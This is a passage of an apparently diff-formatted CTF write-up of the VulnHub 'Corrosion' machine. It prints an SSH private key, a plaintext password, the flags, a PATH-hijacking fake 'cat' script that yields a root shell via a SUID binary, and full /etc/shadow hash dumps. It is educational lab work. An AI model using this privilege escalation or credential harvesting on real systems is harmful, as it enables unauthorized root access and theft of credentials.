+/0InQjtZghzUpm5n2uih1i6NK9XVorljeifmJEWyHzGQk/stkUuBSxa382JNLnS81SomHW
+JX+5wBHL6NY/fBvPiodsLaOnMJTm/1OwAAAMEA6Q+jz/8akC7NnRR6WLLfJXGEVK0mSAyT
+TzXBAG3BIlkPMP463lm+SCTQnhgj1AXq64ozVS1PbYBkVMCaS0dAbWGU1fWYCBy9Qdd0eK
+NLZrlsGWyW19y6EBZRrrQYpFTddMrXiz226+ooubeMFqY0/2zB8JRE4e2s3+JGQmWtQ9Pk
+wbzWGscf7w1YmG7LvV1U45JAoOfUhoLSy8OkZLoKJ7NMJWYASj/dVa3X2EvBsFWPYkVJnu
+WWR6gS/pLqQ5rfAAAACXJhbmR5QHRvcgE=
+-----END OPENSSH PRIVATE KEY-----
+randy@corrosion:~/.ssh$ cat id_rsa.pub  
+cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgg1AuazHZFTVcL5aXj3WSF8aE60aAPEm0SmKgpBjUryBjuBgRxjBK/2WSxsZArZ32R6kZG6DQ+KxbSFm2ZNdHB2C87W5FwnMO3nyIcTSLK6vYQHSHnRmcPUqEMNEyhcyilW1cj3pl1PQRgY1JE5U/5FF3KQEVlRCc1YIMobhhXtvuh27dwN8+Fn0/KoWbr/aUJB05F6k1Tl2SH9UiHZTAHR3kpJjMgf40NDwguhY7NvleJbIurkGoo8i6fb+CTdku7djDFgsScbq7wttEJh2JvxMN/4LrrC2riFtIptvscbiko75Lqx8+8WMopHYPhVuooqBIVioO/g8rwgPnyAesaRX899fiUP+dqDSPZLWjSWUxHT+CZLxyJmq9YdPWNUYdV7GsbSnbm38TCcshtQ2sUlg9T1A+rQTohTHpLvkTpz1y3BRZOD9kmqNduw6Ifjc3SOvbqkv6VvdWQkvdH0ZqktN84WhkFeFy6ZjQaKP07InkuPXqx57CppARZcl9HGU= randy@tor
+</code></pre>
+<h2 id="ssh-as-randy">SSH as randy</h2>
+<p>Credentials randy:randylovesgoldfish1998</p>
+<figure>
+<img src="26.ssh-as-randy.png" alt="" /><figcaption>26.ssh-as-randy</figcaption>
+</figure>
+<h3 id="flag-user.txt">flag user.txt</h3>
+<pre class="shell"><code>randy@corrosion:~$ cat user.txt
+98342721012390839081</code></pre>
+<figure>
+<img src="27.user-flag.png" alt="" /><figcaption>27.user-flag</figcaption>
+</figure>
+<h3 id="homerandytoolseasysysinfo.py">/home/randy/tools/easysysinfo.py</h3>
+<div class="sourceCode" id="cb37"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3.9</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true"></a></span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true"></a><span class="im">import</span> os</span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true"></a></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true"></a>command1 <span class="op">=</span> <span class="st">&quot;/usr/bin/date&quot;</span></span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true"></a>command2 <span class="op">=</span> <span class="st">&quot;/usr/bin/cat /etc/hosts&quot;</span></span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true"></a>command3 <span class="op">=</span> <span class="st">&quot;/usr/bin/uname -a&quot;</span></span>
+<span id="cb37-8"><a href="#cb37-8" aria-hidden="true"></a></span>
+<span id="cb37-9"><a href="#cb37-9" aria-hidden="true"></a></span>
+<span id="cb37-10"><a href="#cb37-10" aria-hidden="true"></a><span class="kw">def</span> output():</span>
+<span id="cb37-11"><a href="#cb37-11" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&quot;Today is: &quot;</span>)</span>
+<span id="cb37-12"><a href="#cb37-12" aria-hidden="true"></a>        os.system(command1)</span>
+<span id="cb37-13"><a href="#cb37-13" aria-hidden="true"></a></span>
+<span id="cb37-14"><a href="#cb37-14" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb37-15"><a href="#cb37-15" aria-hidden="true"></a></span>
+<span id="cb37-16"><a href="#cb37-16" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&quot;Hosts File: &quot;</span>)</span>
+<span id="cb37-17"><a href="#cb37-17" aria-hidden="true"></a>        os.system(command2)</span>
+<span id="cb37-18"><a href="#cb37-18" aria-hidden="true"></a></span>
+<span id="cb37-19"><a href="#cb37-19" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb37-20"><a href="#cb37-20" aria-hidden="true"></a></span>
+<span id="cb37-21"><a href="#cb37-21" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&quot;Kernal Version: &quot;</span>)</span>
+<span id="cb37-22"><a href="#cb37-22" aria-hidden="true"></a>        os.system(command3)</span>
+<span id="cb37-23"><a href="#cb37-23" aria-hidden="true"></a></span>
+<span id="cb37-24"><a href="#cb37-24" aria-hidden="true"></a>output()</span></code></pre></div>
+<figure>
+<img src="28.easysysinfo-py.png" alt="" /><figcaption>28.easysysinfo-py</figcaption>
+</figure>
+<p>These are owned by the root, and it doesn’t look like that there is any issue with python file, since, it is using the full binary path.</p>
+<h3 id="but-user_backupeasyinfo.c-on-the-other-hand">but user_backup/easyinfo.c on the other hand…</h3>
+<div class="sourceCode" id="cb38"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true"></a><span class="dt">void</span> main()</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true"></a>{ setuid(<span class="dv">0</span>);</span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true"></a>  setgid(<span class="dv">0</span>);</span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true"></a>  system(<span class="st">&quot;/usr/bin/date&quot;</span>);</span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true"></a></span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true"></a>  system(<span class="st">&quot;cat /etc/hosts&quot;</span>);</span>
+<span id="cb38-8"><a href="#cb38-8" aria-hidden="true"></a></span>
+<span id="cb38-9"><a href="#cb38-9" aria-hidden="true"></a>  system(<span class="st">&quot;/usr/bin/uname -a&quot;</span>);</span>
+<span id="cb38-10"><a href="#cb38-10" aria-hidden="true"></a></span>
+<span id="cb38-11"><a href="#cb38-11" aria-hidden="true"></a>}</span></code></pre></div>
+<p>There is one opportunity here: <code>cat</code></p>
+<pre class="shell"><code>randy@corrosion:~/tools$ nano cat
+randy@corrosion:~/tools$ cat cat
+#!/usr/bin/env python3
+
+import os
+os.spawn(&quot;/bin/bash&quot;)
+
+randy@corrosion:~/tools$ chmod +x ./cat
+randy@corrosion:~/tools$ export PATH=/home/randy/tools:$PATH
+randy@corrosion:~/tools$ sudo easysysinfo
+[sudo] password for randy: 
+sudo: easysysinfo: command not found
+randy@corrosion:~/tools$ sudo -l
+[sudo] password for randy: 
+Matching Defaults entries for randy on corrosion:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User randy may run the following commands on corrosion:
+    (root) PASSWD: /home/randy/tools/easysysinfo
+randy@corrosion:~/tools$ sudo /home/randy/tools/easysysinfo
+Thu Dec 23 03:37:57 PM MST 2021
+127.0.0.1       localhost
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+randy@corrosion:~/tools$ whomai
+Command &#39;whomai&#39; not found, did you mean:
+  command &#39;whoami&#39; from deb coreutils (8.32-4ubuntu2)
+Try: apt install &lt;deb name&gt;
+randy@corrosion:~/tools$ whoami
+randy</code></pre>
+<p>This didn’t work.</p>
+<pre class="shell"><code>randy@corrosion:~/tools$ easysysinfo
+Thu Dec 23 03:39:51 PM MST 2021
+Traceback (most recent call last):
+  File &quot;/home/randy/tools/cat&quot;, line 4, in &lt;module&gt;
+    os.spawn(&quot;/bin/bash&quot;)
+AttributeError: module &#39;os&#39; has no attribute &#39;spawn&#39;
+Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>This also failed. I think the code I wrote is wrong. I want to execute via “system”.</p>
+<h2 id="root-shell">Root shell</h2>
+<p>I needed to update the code a little, basically use system() and it worked.</p>
+<pre class="shell"><code>randy@corrosion:~/tools$ nano cat
+randy@corrosion:~/tools$ 
+randy@corrosion:~/tools$ easysysinfo
+Thu Dec 23 03:40:48 PM MST 2021
+root@corrosion:~/tools# whoami
+root
+root@corrosion:~/tools# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),133(sambashare),1000(randy)
+root@corrosion:~/tools# hostname
+corrosion
+root@corrosion:~/tools# date
+Thu Dec 23 03:40:54 PM MST 2021
+root@corrosion:~/tools# cat cat
+root@corrosion:~/tools# cat ./cat
+root@corrosion:~/tools# /bin/cat ./cat
+#!/usr/bin/env python3
+
+import os
+os.system(&quot;/bin/bash&quot;)</code></pre>
+<figure>
+<img src="29.root-shell.png" alt="" /><figcaption>29.root-shell</figcaption>
+</figure>
+<h3 id="flag-rootroot.txt">flag /root/root.txt</h3>
+<pre class="shell"><code>root@corrosion:/root# /bin/cat root.txt
+FLAG: 4NJSA99SD7922197D7S90PLAWE 
+
+Congrats! Hope you enjoyed my first machine posted on VulnHub! 
+Ping me on twitter @proxyprgrammer for any suggestions.
+
+Youtube: https://www.youtube.com/c/ProxyProgrammer
+Twitter: https://twitter.com/proxyprgrammer
+root@corrosion:/root# /bin/cat logs.txt
+Complete!</code></pre>
+<h2 id="post-root">Post root</h2>
+<h3 id="etcshadow">/etc/shadow</h3>
+<pre class="shell"><code>root@corrosion:/root# /bin/cat /etc/shadow
+root:$6$TfVaEeYPwMngxSp9$oyTVT.IULXzdgfK3SFd3fQvQK0i36OBg0EgeMPRm3mE/bVXe7Ern2DcUYM9VxSLBPc7L67YDkHSYnclflhYeC/:18838:0:99999:7:::
+daemon:*:18737:0:99999:7:::
+bin:*:18737:0:99999:7:::
+sys:*:18737:0:99999:7:::
+sync:*:18737:0:99999:7:::
+games:*:18737:0:99999:7:::
+man:*:18737:0:99999:7:::
+lp:*:18737:0:99999:7:::
+mail:*:18737:0:99999:7:::
+news:*:18737:0:99999:7:::
+uucp:*:18737:0:99999:7:::
+proxy:*:18737:0:99999:7:::
+www-data:$6$MK5CkKYNaIg4OF8n$vhO7qn8BdlQp7UUf35F1YyMgqc26Kx36G8CrspH2X8iF04maOUnJkyKVvK9wBOVkFxZV0tnuTu7HRahO89qs70:18838:0:99999:7:::
+backup:*:18737:0:99999:7:::
+list:*:18737:0:99999:7:::
+irc:*:18737:0:99999:7:::
+gnats:*:18737:0:99999:7:::
+nobody:*:18737:0:99999:7:::
+systemd-network:*:18737:0:99999:7:::
+systemd-resolve:*:18737:0:99999:7:::
+systemd-timesync:*:18737:0:99999:7:::
+messagebus:*:18737:0:99999:7:::
+syslog:*:18737:0:99999:7:::
+_apt:*:18737:0:99999:7:::
+tss:*:18737:0:99999:7:::
+uuidd:*:18737:0:99999:7:::
+tcpdump:*:18737:0:99999:7:::
+avahi-autoipd:*:18737:0:99999:7:::
+usbmux:*:18737:0:99999:7:::
+rtkit:*:18737:0:99999:7:::
+dnsmasq:*:18737:0:99999:7:::
+avahi:*:18737:0:99999:7:::
+cups-pk-helper:*:18737:0:99999:7:::
+speech-dispatcher:!:18737:0:99999:7:::
+kernoops:*:18737:0:99999:7:::
+nm-openvpn:*:18737:0:99999:7:::
+whoopsie:*:18737:0:99999:7:::
+sssd:*:18737:0:99999:7:::
+saned:*:18737:0:99999:7:::
+colord:*:18737:0:99999:7:::
+geoclue:*:18737:0:99999:7:::
+pulse:*:18737:0:99999:7:::
+hplip:*:18737:0:99999:7:::
+gnome-initial-setup:*:18737:0:99999:7:::
+gdm:*:18737:0:99999:7:::
+randy:$6$uitDYvcMEME.Bn7.$uy3Dp.lj14tVzCTyreEOg3z/omnN8Q6Ik/3CdLxGIHtTzxgYS9j7eT1e2jN4Y5swjwp968c7bTnonDoxsqinC/:18838:0:99999:7:::
+systemd-coredump:!*:18837::::::
+sshd:*:18838:0:99999:7:::</code></pre>
+<h3 id="etcshadow-">/etc/shadow-</h3>
+<pre class="shell"><code>root@corrosion:/root# /bin/cat /etc/shadow-
+root:$6$p89GC0ykFykpCPGX$Ncc97T/NI3NO.I4SpwPm1c9iu4Q7n6peTi9lGxyorje6tAHWF18LoJUMTjHBvcf3GDg/kwJQqx2yqHGruXcRj.:18837:0:99999:7:::
+daemon:*:18737:0:99999:7:::
+bin:*:18737:0:99999:7:::
+sys:*:18737:0:99999:7:::
+sync:*:18737:0:99999:7:::
+games:*:18737:0:99999:7:::
+man:*:18737:0:99999:7:::
+lp:*:18737:0:99999:7:::
+mail:*:18737:0:99999:7:::
+news:*:18737:0:99999:7:::
+uucp:*:18737:0:99999:7:::
+proxy:*:18737:0:99999:7:::
+www-data:$6$xnldcyGulQpBL50e$b6zfRWP0Y0OdT0seqWKvgC9HlwDc4rXxVNLVSl2v7iwePritznJP1eZI0SYSq.T/DaVgiqqqBolAQl8hVr2pg.:18837:0:99999:7:::
+backup:*:18737:0:99999:7:::
+list:*:18737:0:99999:7:::
+irc:*:18737:0:99999:7:::
+gnats:*:18737:0:99999:7:::
+nobody:*:18737:0:99999:7:::
+systemd-network:*:18737:0:99999:7:::
+systemd-resolve:*:18737:0:99999:7:::
+systemd-timesync:*:18737:0:99999:7:::
+messagebus:*:18737:0:99999:7:::
+syslog:*:18737:0:99999:7:::
+_apt:*:18737:0:99999:7:::
+tss:*:18737:0:99999:7:::
+uuidd:*:18737:0:99999:7:::
+tcpdump:*:18737:0:99999:7:::
+avahi-autoipd:*:18737:0:99999:7:::
+usbmux:*:18737:0:99999:7:::
+rtkit:*:18737:0:99999:7:::
+dnsmasq:*:18737:0:99999:7:::
+avahi:*:18737:0:99999:7:::
+cups-pk-helper:*:18737:0:99999:7:::
+speech-dispatcher:!:18737:0:99999:7:::
+kernoops:*:18737:0:99999:7:::
+nm-openvpn:*:18737:0:99999:7:::
+whoopsie:*:18737:0:99999:7:::
+sssd:*:18737:0:99999:7:::
+saned:*:18737:0:99999:7:::
+colord:*:18737:0:99999:7:::
+geoclue:*:18737:0:99999:7:::
+pulse:*:18737:0:99999:7:::
+hplip:*:18737:0:99999:7:::
+gnome-initial-setup:*:18737:0:99999:7:::
+gdm:*:18737:0:99999:7:::
+randy:$6$TExby1tuyfJUl0C3$QSPNqH0FhPBdPKU2jYVoAxLWuq5sFq0Iz25QUNcMBT0zlZbg8LXdUVgrlVKp84/3nkyOBeZsRKwqUFX7fvs.z.:18837:0:99999:7:::
+systemd-coredump:!*:18837::::::
+sshd:*:18838:0:99999:7:::</code></pre>
+<pre class="shell"><code>root@corrosion:/root# diff /etc/shadow /etc/shadow-
+1c1
+&lt; root:$6$TfVaEeYPwMngxSp9$oyTVT.IULXzdgfK3SFd3fQvQK0i36OBg0EgeMPRm3mE/bVXe7Ern2DcUYM9VxSLBPc7L67YDkHSYnclflhYeC/:18838:0:99999:7:::
+---
+&gt; root:$6$p89GC0ykFykpCPGX$Ncc97T/NI3NO.I4SpwPm1c9iu4Q7n6peTi9lGxyorje6tAHWF18LoJUMTjHBvcf3GDg/kwJQqx2yqHGruXcRj.:18837:0:99999:7:::
+13c13
+&lt; www-data:$6$MK5CkKYNaIg4OF8n$vhO7qn8BdlQp7UUf35F1YyMgqc26Kx36G8CrspH2X8iF04maOUnJkyKVvK9wBOVkFxZV0tnuTu7HRahO89qs70:18838:0:99999:7:::
+---
+&gt; www-data:$6$xnldcyGulQpBL50e$b6zfRWP0Y0OdT0seqWKvgC9HlwDc4rXxVNLVSl2v7iwePritznJP1eZI0SYSq.T/DaVgiqqqBolAQl8hVr2pg.:18837:0:99999:7:::
+46c46
+&lt; randy:$6$uitDYvcMEME.Bn7.$uy3Dp.lj14tVzCTyreEOg3z/omnN8Q6Ik/3CdLxGIHtTzxgYS9j7eT1e2jN4Y5swjwp968c7bTnonDoxsqinC/:18838:0:99999:7:::
+---
+&gt; randy:$6$TExby1tuyfJUl0C3$QSPNqH0FhPBdPKU2jYVoAxLWuq5sFq0Iz25QUNcMBT0zlZbg8LXdUVgrlVKp84/3nkyOBeZsRKwqUFX7fvs.z.:18837:0:99999:7:::</code></pre>
+<h2 id="easysysinfo-works-without-sudo">easysysinfo works without sudo</h2>
+<pre class="shell"><code>randy@corrosion:~/tools$ sudo ./easysysinfo
+Thu Dec 23 03:45:21 PM MST 2021
+127.0.0.1       localhost
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+
+randy@corrosion:~/tools$ which easysysinfo
+/home/randy/tools/easysysinfo
+
+
+randy@corrosion:~/tools$ sudo `which easysysinfo`
+Thu Dec 23 03:45:47 PM MST 2021
+127.0.0.1       localhost
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+Linux corrosion 5.11.0-25-generic #27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>All of the above fail.</p>
+<pre class="shell"><code>randy@corrosion:~/tools$ easysysinfo
+Thu Dec 23 03:46:33 PM MST 2021
+root@corrosion:~/tools# 
+</code></pre>
+<p>This however succeeds.</p>
+<p>When we searched for SUID binaries earlier, we couldn’t find easysysinfo because the binary lives in /home/randy/tools/, to which www-data didn’t have any access.</p>
+<p>Rooted.</p>
+<h2 id="how-to-root">How to root</h2>
+<ol type="1">
+<li>Get web page.</li>
+<li>Fuzz the empty page for LFI.</li>
+<li>Poison log for RCE.</li>
+<li>Catch reverse shell.</li>
+<li>Find backup.</li>
+<li>Become randy.</li>
+<li>Become root.</li>
+<li>???</li>
+<li>Profit.</li>
+</ol>
